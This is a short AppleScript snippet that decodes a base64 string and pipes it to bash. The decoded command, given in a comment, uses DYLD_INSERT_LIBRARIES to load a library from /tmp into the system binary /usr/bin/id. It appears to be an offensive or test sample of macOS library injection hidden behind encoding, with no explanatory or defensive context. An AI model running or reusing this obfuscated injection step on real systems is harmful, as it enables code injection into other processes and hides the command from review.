-- base64 of: DYLD_INSERT_LIBRARIES=/tmp/proxy.dylib /usr/bin/id
set encoded to "RFlMRF9JTlNFUlRfTElCUkFSSUVTPS90bXAvcHJveHkuZHlsaWIgL3Vzci9iaW4vaWQ="
do shell script "echo " & encoded & " | base64 -D | bash"
